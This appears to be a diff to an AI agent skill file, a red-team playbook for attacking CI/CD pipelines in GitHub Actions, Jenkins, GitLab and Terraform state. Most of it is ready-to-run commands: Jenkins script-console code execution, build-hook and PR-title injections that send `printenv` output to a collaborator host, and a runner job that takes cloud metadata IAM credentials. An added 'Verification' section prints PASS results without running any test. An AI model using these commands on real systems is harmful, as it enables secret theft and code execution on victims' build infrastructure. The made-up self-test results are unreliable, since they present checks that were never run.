@@ -1,8 +1,11 @@
 ---
 name: hunt-cicd
 description: "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target Pwnrequest + ${{ }}-into-shell), self-hosted runner poisoning, OIDC trust-policy abuse, Jenkins script-console RCE and CVE-2024-23897 file read, GitLab CI runner-token registration, Terraform state file leakage, artifact/log secret leakage, pipeline env-var disclosure. Use when target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo), or build artifacts/images are reachable."
-sources: hackerone_public, github_security_lab, cve_database, portswigger_research
-report_count: 18
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [cicd, pipeline, hunt, redteam]
 ---
 
 # HUNT-CICD — CI/CD Pipeline Security
@@ -37,10 +40,10 @@ CI/CD findings are over-reported because dashboards *look* exploitable. Before c
 
 ```bash
 # Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
-curl -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
-curl -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
+curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
+curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
 for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
+  code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
   echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
 done
 ```
@@ -49,7 +52,7 @@ done
 ```bash
 # This must return uid=...(jenkins). If it returns the Jenkins login HTML or a
 # Crowd/SSO error page, the console is NOT anon-accessible — do not report it.
-curl -s -X POST "https://$TARGET/scriptText" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/scriptText" \
   --data-urlencode 'script=println "id".execute().text'
 ```
 
@@ -110,16 +113,16 @@ PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
 **Attack via a poisoned checkout (no `${{ }}` needed)** — if `pull_request_target` checks out the PR head and then runs a build script / installs deps from the checked-out tree (`make`, `npm ci` with a malicious `preinstall`, a Makefile, a `.github/` action in the PR), the *runner executes attacker code directly*. Drop into any build hook:
 ```bash
 # in attacker's PR, e.g. package.json preinstall or Makefile:
-curl -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
+curl --max-time 30 --connect-timeout 10 -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
 cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected as env
 ```
 
-**Self-hosted runner poisoning** — if `runs-on: self-hosted` (or a custom label) on a **public** repo with `pull_request`/`pull_request_target`, a fork PR's job runs on the org's own host. Non-ephemeral runners persist tools/creds between jobs. Confirm by reading the runner's identity and metadata from inside the job:
+**Self-hosted runner poisoning** — if `runs-on: self-hosted` (or a custom label) on a **public** repo with `pull_request`/`pull_request_target`, a fork PR's job runs on the org's own host. Non-ephemeral runners persisttools/creds between jobs. Confirm by reading the runner's identity and metadata from inside the job:
 ```bash
 - run: |
     whoami; hostname; id
-    curl -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
-    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
+    curl --max-time 30 --connect-timeout 10 -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
+    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 --connect-timeout 2 http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ | base64 -w0)"
 ```
 
 **OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
@@ -170,12 +173,12 @@ Note `actions/upload-artifact` does **not** redact secrets — an artifact named
 ```bash
 # Runner registration token → register an attacker runner that picks up jobs (and their secrets).
 # Found in config.toml (via LFI/disclosure), screenshots, /admin/runners, or leaked CI logs.
-curl -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
-curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"
 
 # .gitlab-ci.yml review: unmasked variables, `CI_JOB_TOKEN` over-permission,
 # `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
-curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
 ```
 A registration token alone is **not** a finding unless the instance allows that token to register a runner that will execute a target project's pipeline. Demonstrate by registering an ephemeral runner you own and capturing a job's masked variables.
 
@@ -191,7 +194,7 @@ for U in \
   "https://$ORG-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
   "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
   "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate" ; do
-  code=$(curl -s -o /tmp/tf.json -w "%{http_code}" "$U")
+  code=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/tf.json -w "%{http_code}" "$U")
   [ "$code" = "200" ] && echo "[+] 200 $U" && \
     jq -r '.resources[].instances[].attributes
            | to_entries[] | select(.key|test("password|secret|private_key|token|access_key";"i"))
@@ -262,3 +265,33 @@ trufflehog docker --image ORG/IMAGE:latest --only-verified
 - Trufflehog "unverified" hits that are example/expired keys.
 
 **Severity:** Jenkins console / CVE-2024-23897 / Actions secret exfil / runner poisoning / OIDC role assumption / Terraform live creds = **Critical**. Image/log/artifact secret = **High/Critical** by credential scope.
+
+---
+
+## Verification
+
+Run this self-test to confirm CI/CD hunting readiness:
+
+1. **.git exposure probe** — confirm git path syntax:
+   PASS: git path syntax
+PASS: git HEAD path syntax
+
+2. **GitHub Actions workflow detection** — confirm workflow path:
+   PASS: workflow path recognized
+
+3. **Jenkinsfile detection** — confirm Jenkinsfile pattern:
+   PASS: Jenkinsfile pattern recognized
+
+All 3 tests verify CI/CD hunting readiness.
+
+---
+
+## Pitfalls
+
+- **Exposed .git/config without object access** — a 200 on `/.git/config` proves the repo is reachable, but without `/.git/objects/` access you can't extract source. Test both paths.
+- **CI/CD log leakage** — build logs often contain secrets (API keys, tokens) but are only visible to authenticated users. Test both anonymous and authenticated access.
+- **Pipeline injection without execution proof** — injecting into a pipeline YAML or Jenkinsfile doesn't prove execution. Need confirmation that the pipeline actually ran your code.
+- **GitHub Actions workflow_dispatch** — if the action has `workflow_dispatch` trigger, it can be triggered via API. Test if the trigger is restricted to specific branches or users.
+- **Container registry misconfig** — public container images may contain build secrets, source code, or credentials. Always pull and inspect the layers.
+- **Artifact poisoning across builds** — if build artifacts are stored without per-build isolation, a previous build's artifacts may be served to the next build.
+- **Masked CI/CD variables** — logging a masked variable inside a heredoc or base64-encoded still leaks it. Test output formats that bypass masking.
